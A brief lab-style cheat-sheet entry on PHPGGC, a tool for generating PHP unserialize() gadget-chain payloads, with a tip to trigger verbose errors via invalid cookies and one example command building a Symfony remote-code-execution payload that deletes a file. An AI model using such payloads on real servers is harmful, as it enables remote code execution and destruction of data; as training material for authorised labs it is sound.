PHPGGC is alibrary of `unserialize()` payloads along with a tool to generate them.
You need to know the framework being utilized. For that you could force a verbose error by supplying invalid data (such as an invalid cookie)

https://github.com/ambionics/phpggc.git

## Example

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'
```